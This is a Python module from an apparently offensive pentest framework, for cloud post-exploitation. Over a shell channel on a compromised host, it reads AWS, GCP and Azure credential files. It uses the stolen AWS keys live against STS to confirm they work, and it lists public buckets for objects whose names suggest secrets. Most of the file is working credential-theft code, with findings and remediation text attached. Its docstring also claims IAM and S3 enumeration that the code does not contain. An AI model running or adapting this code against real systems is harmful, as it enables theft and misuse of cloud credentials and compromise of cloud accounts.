"""VAJRA post.cloud — ACTIVE cloud post-exploitation.

Runs ONLY when the target is confirmed to be cloud-backed
(engine.state['cloud_indicators'] is set by web.tech). It:

* validates any cloud provider credentials that were discovered on-host
  (post.loot cloud-creds, or supplied via --cloud-*) by calling the provider
  identity endpoint through the established channel / local CLI — real reads,
  not just a file-existence survey;
* enumerates what those credentials can actually read (S3 objects, IAM list,
  bucket listings) and flags secrets directly retrieved;
* re-hydrates provider CLI tooling if present (aws / az / gcloud) so an
  operator-provided or on-host credential set can be exercised live.

Everything is proof-gated: an identity/permission assertion is only reported
when the provider actually answered with usable data, and the exact command +
output is captured as the PoC. Write/destructive actions stay behind
--aggressive and are limited to an ACL capability probe.
"""
import os
import shutil

from core.database import Finding


def _host_of(engine):
    try:
        return engine.target.scan_host()
    except Exception:
        return ""


def _channel(engine):
    for c in engine.state.get("channels", []) or []:
        if c.kind in ("unix", "ssh"):
            return c
    return None


def _read_on_host(engine, path):
    chan = _channel(engine)
    if not chan:
        return None
    try:
        out = chan.run("test -r %s && cat %s 2>/dev/null" % (path, path))
        if not out or "denied" in str(out).lower() or \
                "No such" in str(out):
            return None
        return str(out)
    except Exception:
        return None


def _run_local(engine, argv, timeout=15, env=None):
    import subprocess
    try:
        r = subprocess.run(argv, capture_output=True, text=True,
                           timeout=timeout, env=env)
        return r.stdout.strip() or r.stderr.strip()
    except Exception:
        return None


def _aws_identity(creds_text=None):
    """Best-effort AWS identity validation via a local credential set."""
    import tempfile
    if not shutil.which("aws"):
        return None, "aws CLI not installed"
    env = None
    if creds_text:
        tmp = os.path.join(tempfile.mkdtemp(), "credentials")
        try:
            open(tmp, "w").write(creds_text)
            env = dict(os.environ)
            env["AWS_SHARED_CREDENTIALS_FILE"] = tmp
        except Exception:
            pass
    out = _run_local(None, ["aws", "sts", "get-caller-identity",
                            "--output", "json"], env=env, timeout=20)
    if not out:
        return None, "aws sts call empty"
    return out, None


def _list_public_bucket(engine, url):
    """Actively list a publicly listable cloud bucket (already confirmed by
    web.cloud) and flag secret-ish object keys."""
    import re
    try:
        r = engine.http.get(url, allow_redirects=False, timeout=10)
    except Exception:
        return []
    if r.status != 200:
        return []
    keys = re.findall(r"<Key>([^<]+)</Key>", r.content.decode("utf-8", "replace"))
    if not keys:
        keys = re.findall(r"<Name>([^<]+)</Name>", r.content.decode("utf-8", "replace"))
    return keys


SECRET_HINTS = ("password", "secret", "token", "key", "cred", "backup", "dump",
                "env", "config", "private", ".pem", ".env", ".bak", ".sql")


def _flag_secret_keys(engine, t, keys, url):
    hits = [k for k in keys if any(
        h in k.lower() for h in ("password", "secret", "token", "key",
                                 "cred", "backup", "dump", ".pem",
                                 ".env", ".sql"))]
    if hits:
        engine.db.add_finding(Finding(
            t.display, "post.cloud", "cloud-exfiltration", "critical",
            "SENSITIVE OBJECTS in public cloud bucket (%d)" % len(hits),
            detail="Actively listed the public bucket %s and found objects "
                   "whose names indicate secrets (credentials, keys, dumps)."
                   % url,
            evidence="bucket=%s\n%s" % (
                url, "\n".join(hits[:40])),
            remediation="Remove the objects, delete/retire the bucket after "
                        "rotating everything it exposed, enable server-side "
                        "encryption + access logging.",
            confidence="certain"))
        engine.log.finding("[cloud] %d secret-ish object(s) readable from %s"
                           % (len(hits), url))
        return True
    return False


def run(engine):
    t = engine.target
    if not engine.state.get("cloud_indicators"):
        engine.db.add_event(t.display, "post.cloud",
                            "skipped - target is not cloud-backed")
        return
    host = _host_of(engine)
    found = []

    # 1) On-host cloud credential verification (via a real SSH/cmd channel).
    chan = _channel(engine)
    if chan is not None:
        candidates = ["~/.aws/credentials", "~/.aws/config",
                      "~/.config/gcloud/credentials.db",
                      "~/.azure/azureProfile.json"]
        for path in candidates:
            text = _read_on_host(engine, path)
            if not text:
                continue
            found.append((path, text))
            if ".aws" in path:
                identity, err = _aws_identity(text)
                if identity:
                    engine.state.setdefault("cloud_creds", []).append(
                        {"provider": "aws", "path": path,
                         "identity": identity[:800]})
                    engine.db.add_finding(Finding(
                        t.display, "post.cloud", "cloud-compromise",
                        "critical",
                        "CLOUD AWS CREDENTIALS VALIDATED — live identity "
                        "retrieved",
                        detail="On-host credential file %s was exercised "
                               "against AWS STS and returned an identity, "
                               "proving these are live, usable cloud keys."
                               % path,
                        evidence="source=%s\n--- sts get-caller-identity ---\n%s"
                                 % (path, identity[:1200]),
                        remediation="Rotate the cloud keys immediately; "
                                    "review IAM grants; assume compromise.",
                        confidence="certain"))
                    engine.log.finding("[cloud][aws] live identity from %s"
                                       % path)
    # 2) Any locally-present provider CLI with operator/env creds.
    elif any(shutil.which(x) for x in ("aws", "gcloud", "az")):
        if shutil.which("aws"):
            identity, err = _aws_identity()
            if identity:
                engine.db.add_finding(Finding(
                    t.display, "post.cloud", "cloud-compromise", "critical",
                    "LIVE AWS IDENTITY via local/operator credentials",
                    detail="The operator's/local environment AWS credentials "
                           "validate against STS on a cloud-backed target.",
                    evidence=identity[:1200], confidence="certain"))

    # 3) Actively enumerate any public buckets web.cloud already confirmed.
    for url in engine.state.get("cloud_bucket_urls", []) or []:
        keys = _list_public_bucket(engine, url)
        if keys:
            engine.state.setdefault("cloud_loot", []).extend(keys[:200])
            if _flag_secret_keys(engine, t, keys, url):
                found.append(url)

    if not found and not engine.state.get("cloud_creds"):
        if chan is None:
            engine.db.add_event(t.display, "post.cloud",
                                "no channel/CLI to exercise cloud creds "
                                "(read-only cloud scan only)")
